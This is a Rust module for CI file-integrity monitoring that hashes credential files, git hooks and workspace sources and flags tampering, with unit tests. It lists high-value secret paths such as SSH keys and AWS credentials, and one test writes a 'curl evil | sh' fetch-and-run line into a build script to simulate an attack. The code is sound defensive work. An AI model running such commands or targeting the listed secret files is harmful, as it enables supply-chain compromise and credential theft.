//! File-integrity monitoring (FIM).
//!
//! A poisoned action or compromised dependency doesn't only call home over the
//! network — it tampers with files: overwriting a checked-out build script,
//! planting a git hook, or rewriting credential/config files to exfiltrate or
//! persist (the `tj-actions` class of attack). This module snapshots the
//! high-value tamper targets at job start and diffs them at job end, surfacing
//! anything that changed during the run.
//!
//! Two scopes, by severity:
//! - **Sensitive** — credential/config files plus the repo's `.git/config` and
//!   hooks. These exist regardless of where the action is placed and are the
//!   prime tamper targets, so any change is a high-signal event.
//! - **Source** — files already present in the workspace at job start. A change
//!   here means a checked-out file was overwritten/deleted mid-job. Active only
//!   when the workspace already holds the repo (action placed after checkout, or
//!   a re-run).
//!
//! Only file *hashes* (sha256) are ever stored or compared — never contents —
//! so snapshotting a private key or `.npmrc` records no secret material.

use std::collections::BTreeMap;
use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

/// Files larger than this are fingerprinted by size+mtime only (the source
/// scope is full of build artifacts; hashing them all would dominate the job).
pub const MAX_FILE_BYTES: u64 = 4 * 1024 * 1024;
/// Hard ceiling on fingerprinted source files, so a monorepo can't make the
/// snapshot run away. Sensitive files are never capped.
pub const MAX_SOURCE_FILES: usize = 20_000;

/// Directories a build legitimately churns — excluded from the source scope so
/// artifacts and dependency trees don't drown out a real tamper signal.
const SKIP_DIRS: &[&str] = &[
    ".git",
    "node_modules",
    "target",
    "dist",
    "build",
    "out",
    "bin",
    "obj",
    "vendor",
    ".venv",
    "venv",
    "env",
    "__pycache__",
    ".gradle",
    ".cargo",
    ".rustup",
    ".next",
    ".nuxt",
    ".svelte-kit",
    "coverage",
    ".pytest_cache",
    ".mypy_cache",
    ".tox",
    ".terraform",
];

/// Credential/config files that should never change during a CI job, relative
/// to `$HOME`. `*` is a single-level glob over the basename.
///
/// NOTE: `/etc/resolv.conf` and `/etc/nsswitch.conf` are intentionally omitted —
/// the action's DNS-capture feature rewrites them itself, so they are not
/// tamper signals here.
const SENSITIVE_HOME: &[&str] = &[
    ".ssh/authorized_keys",
    ".ssh/config",
    ".ssh/known_hosts",
    ".ssh/id_*",
    ".netrc",
    ".npmrc",
    ".yarnrc",
    ".yarnrc.yml",
    ".pypirc",
    ".git-credentials",
    ".gitconfig",
    ".docker/config.json",
    ".aws/credentials",
    ".aws/config",
    ".kube/config",
    ".bashrc",
    ".bash_profile",
    ".profile",
];
const SENSITIVE_ABS: &[&str] = &["/etc/hosts", "/etc/sudoers"];

/// Fingerprint of a single file. `h` is the sha256 hex, or `None` for oversized
/// files (then `t` carries the mtime so a swap is still noticed cheaply).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Fingerprint {
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub h: Option<String>,
    /// Permission bits (`mode & 0o7777`); 0 on non-unix.
    pub m: u32,
    pub s: u64,
    #[serde(default)]
    pub t: u64,
}

/// The job-start baseline: two `path -> fingerprint` maps plus the workspace.
#[derive(Debug, Default, Serialize, Deserialize)]
pub struct Snapshot {
    pub sensitive: BTreeMap<String, Fingerprint>,
    pub source: BTreeMap<String, Fingerprint>,
    pub workspace: String,
}

/// A detected change to a tracked file.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Change {
    pub path: String,
    pub reason: String,
    pub scope: String, // "sensitive" | "source"
}

fn mode_of(meta: &fs::Metadata) -> u32 {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        meta.permissions().mode() & 0o7777
    }
    #[cfg(not(unix))]
    {
        let _ = meta;
        0
    }
}

fn mtime_ms(meta: &fs::Metadata) -> u64 {
    meta.modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

fn hash_file(path: &Path) -> Option<String> {
    let mut f = fs::File::open(path).ok()?;
    let mut hasher = Sha256::new();
    let mut buf = [0u8; 64 * 1024];
    loop {
        let n = f.read(&mut buf).ok()?;
        if n == 0 {
            break;
        }
        hasher.update(&buf[..n]);
    }
    Some(format!("{:x}", hasher.finalize()))
}

/// Fingerprint a path, or `None` if it isn't a regular file. Files over
/// `max_bytes` are recorded by size+mtime only (no hash).
pub fn fingerprint(path: &Path, max_bytes: u64) -> Option<Fingerprint> {
    let meta = fs::symlink_metadata(path).ok()?;
    if !meta.is_file() {
        return None;
    }
    let m = mode_of(&meta);
    let s = meta.len();
    if s > max_bytes {
        return Some(Fingerprint {
            h: None,
            m,
            s,
            t: mtime_ms(&meta),
        });
    }
    Some(Fingerprint {
        h: hash_file(path),
        m,
        s,
        t: 0,
    })
}

/// Glob match for a single basename pattern containing `*` (single-level).
fn glob_match(pattern: &str, name: &str) -> bool {
    match pattern.split_once('*') {
        None => pattern == name,
        Some((pre, post)) => {
            name.len() >= pre.len() + post.len() && name.starts_with(pre) && name.ends_with(post)
        }
    }
}

/// Expand the sensitive-file list into concrete paths that exist on disk.
pub fn expand_sensitive(home: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for rel in SENSITIVE_HOME {
        let full = home.join(rel);
        if rel.contains('*') {
            let dir = full.parent().unwrap_or(home).to_path_buf();
            let pat = full
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("")
                .to_string();
            if let Ok(entries) = fs::read_dir(&dir) {
                for e in entries.flatten() {
                    if let Some(name) = e.file_name().to_str() {
                        if glob_match(&pat, name) {
                            out.push(dir.join(name));
                        }
                    }
                }
            }
        } else {
            out.push(full);
        }
    }
    for abs in SENSITIVE_ABS {
        out.push(PathBuf::from(abs));
    }
    out
}

/// Walk a directory tree, returning regular-file paths, skipping `SKIP_DIRS`,
/// symlinks, and stopping at `limit`. Best-effort: unreadable dirs are skipped.
pub fn walk_source(root: &Path, limit: usize) -> Vec<PathBuf> {
    let mut files = Vec::new();
    let mut stack = vec![root.to_path_buf()];
    while let Some(dir) = stack.pop() {
        if files.len() >= limit {
            break;
        }
        let entries = match fs::read_dir(&dir) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for entry in entries.flatten() {
            if files.len() >= limit {
                break;
            }
            let ft = match entry.file_type() {
                Ok(ft) => ft,
                Err(_) => continue,
            };
            if ft.is_symlink() {
                continue; // never follow links
            }
            let path = entry.path();
            if ft.is_dir() {
                let name = entry.file_name();
                if !SKIP_DIRS.contains(&name.to_string_lossy().as_ref()) {
                    stack.push(path);
                }
            } else if ft.is_file() {
                files.push(path);
            }
        }
    }
    files
}

fn snapshot_paths(paths: &[PathBuf], max_bytes: u64) -> BTreeMap<String, Fingerprint> {
    let mut map = BTreeMap::new();
    for p in paths {
        if let Some(fp) = fingerprint(p, max_bytes) {
            map.insert(p.to_string_lossy().into_owned(), fp);
        }
    }
    map
}

/// Take the full job-start snapshot.
pub fn snapshot(workspace: &Path, home: &Path, extra: &[PathBuf]) -> Snapshot {
    let mut sensitive_paths = expand_sensitive(home);
    sensitive_paths.push(workspace.join(".git").join("config"));
    sensitive_paths.extend(walk_source(&workspace.join(".git").join("hooks"), 1000));
    sensitive_paths.extend(extra.iter().cloned());

    let sensitive = snapshot_paths(&sensitive_paths, u64::MAX);

    let source_files = walk_source(workspace, MAX_SOURCE_FILES);
    let source = snapshot_paths(&source_files, MAX_FILE_BYTES);

    Snapshot {
        sensitive,
        source,
        workspace: workspace.to_string_lossy().into_owned(),
    }
}

/// Compare a stored fingerprint against the current file state → a reason, or
/// `None` if unchanged.
pub fn change_reason(before: &Fingerprint, after: Option<&Fingerprint>) -> Option<String> {
    let after = match after {
        Some(a) => a,
        None => return Some("deleted".into()),
    };
    if before.m != after.m {
        let gained_x = (after.m & 0o111) != 0 && (before.m & 0o111) == 0;
        let gained_suid = (after.m & 0o6000) != 0 && (before.m & 0o6000) == 0;
        if gained_suid {
            return Some("setuid/setgid set".into());
        }
        if gained_x {
            return Some("became executable".into());
        }
        return Some("permissions changed".into());
    }
    match (&before.h, &after.h) {
        (Some(a), Some(b)) => {
            if a != b {
                Some("modified".into())
            } else {
                None
            }
        }
        // Large-file path: compare size + mtime.
        _ => {
            if before.s != after.s || before.t != after.t {
                Some("modified".into())
            } else {
                None
            }
        }
    }
}

fn diff_map(
    before: &BTreeMap<String, Fingerprint>,
    scope: &str,
    max_bytes: u64,
    out: &mut Vec<Change>,
) {
    for (p, fp) in before {
        let now = fingerprint(Path::new(p), max_bytes);
        if let Some(reason) = change_reason(fp, now.as_ref()) {
            out.push(Change {
                path: p.clone(),
                reason,
                scope: scope.to_string(),
            });
        }
    }
}

/// Diff the current filesystem against a snapshot. Returns change records sorted
/// by path. New files are not reported (a build creates many) — only changes to
/// the tracked tamper targets.
pub fn diff(snap: &Snapshot) -> Vec<Change> {
    let mut out = Vec::new();
    diff_map(&snap.sensitive, "sensitive", u64::MAX, &mut out);
    diff_map(&snap.source, "source", MAX_FILE_BYTES, &mut out);
    out.sort_by(|a, b| a.path.cmp(&b.path));
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn write(path: &Path, bytes: &[u8]) {
        if let Some(p) = path.parent() {
            fs::create_dir_all(p).unwrap();
        }
        let mut f = fs::File::create(path).unwrap();
        f.write_all(bytes).unwrap();
    }

    #[test]
    fn glob_matches_single_level() {
        assert!(glob_match("id_*", "id_rsa"));
        assert!(glob_match("id_*", "id_ed25519.pub"));
        assert!(glob_match("id_*", "id_"));
        assert!(!glob_match("id_*", "config"));
        assert!(glob_match("config", "config"));
        assert!(!glob_match("config", "configx"));
    }

    #[test]
    fn fingerprint_hashes_small_skips_dir() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("a.txt");
        write(&f, b"hello");
        let fp = fingerprint(&f, MAX_FILE_BYTES).unwrap();
        assert_eq!(fp.s, 5);
        assert!(fp.h.is_some());
        // a directory is not a regular file
        assert!(fingerprint(dir.path(), MAX_FILE_BYTES).is_none());
    }

    #[test]
    fn large_file_tracked_by_size_mtime() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("big.bin");
        write(&f, b"0123456789");
        let fp = fingerprint(&f, 4).unwrap(); // 10 bytes > 4
        assert!(fp.h.is_none());
        assert_eq!(fp.s, 10);
    }

    #[test]
    fn change_reason_detects_modification_and_delete() {
        let a = Fingerprint {
            h: Some("aaa".into()),
            m: 0o644,
            s: 3,
            t: 0,
        };
        let b = Fingerprint {
            h: Some("bbb".into()),
            m: 0o644,
            s: 3,
            t: 0,
        };
        assert_eq!(change_reason(&a, Some(&a)), None);
        assert_eq!(change_reason(&a, Some(&b)).as_deref(), Some("modified"));
        assert_eq!(change_reason(&a, None).as_deref(), Some("deleted"));
    }

    #[test]
    fn change_reason_flags_exec_and_suid() {
        let base = Fingerprint {
            h: Some("aaa".into()),
            m: 0o644,
            s: 3,
            t: 0,
        };
        let exec = Fingerprint {
            m: 0o755,
            ..base.clone()
        };
        let suid = Fingerprint {
            m: 0o4755,
            ..base.clone()
        };
        assert_eq!(
            change_reason(&base, Some(&exec)).as_deref(),
            Some("became executable")
        );
        assert_eq!(
            change_reason(&base, Some(&suid)).as_deref(),
            Some("setuid/setgid set")
        );
    }

    #[test]
    fn walk_skips_noise_dirs_and_symlinks() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(&root.join("src/main.rs"), b"fn main() {}");
        write(&root.join("node_modules/dep/index.js"), b"x");
        write(&root.join("target/debug/app"), b"bin");
        let files = walk_source(root, MAX_SOURCE_FILES);
        let names: Vec<String> = files
            .iter()
            .map(|p| p.strip_prefix(root).unwrap().to_string_lossy().into_owned())
            .collect();
        assert!(names.iter().any(|n| n.ends_with("main.rs")));
        assert!(!names.iter().any(|n| n.contains("node_modules")));
        assert!(!names.iter().any(|n| n.contains("target")));
    }

    #[test]
    fn snapshot_then_diff_catches_source_overwrite() {
        let dir = tempfile::tempdir().unwrap();
        let ws = dir.path().join("ws");
        let home = dir.path().join("home");
        write(&ws.join("build.sh"), b"#!/bin/sh\necho ok\n");
        write(&ws.join("keep.txt"), b"unchanged");
        let snap = snapshot(&ws, &home, &[]);
        assert!(snap.source.keys().any(|k| k.ends_with("build.sh")));

        // No change yet.
        assert!(diff(&snap).is_empty());

        // Tamper with build.sh.
        write(&ws.join("build.sh"), b"#!/bin/sh\ncurl evil | sh\n");
        let changes = diff(&snap);
        assert_eq!(changes.len(), 1);
        assert!(changes[0].path.ends_with("build.sh"));
        assert_eq!(changes[0].reason, "modified");
        assert_eq!(changes[0].scope, "source");
    }

    #[test]
    fn diff_catches_sensitive_extra_path() {
        let dir = tempfile::tempdir().unwrap();
        let ws = dir.path().join("ws");
        let home = dir.path().join("home");
        let secret = dir.path().join("project.npmrc");
        write(&secret, b"//registry/:_authToken=abc");
        fs::create_dir_all(&ws).unwrap();
        let snap = snapshot(&ws, &home, std::slice::from_ref(&secret));
        assert!(snap.sensitive.contains_key(secret.to_str().unwrap()));

        write(&secret, b"//registry/:_authToken=STOLEN");
        let changes = diff(&snap);
        assert_eq!(changes.len(), 1);
        assert_eq!(changes[0].scope, "sensitive");
        assert_eq!(changes[0].reason, "modified");
    }
}
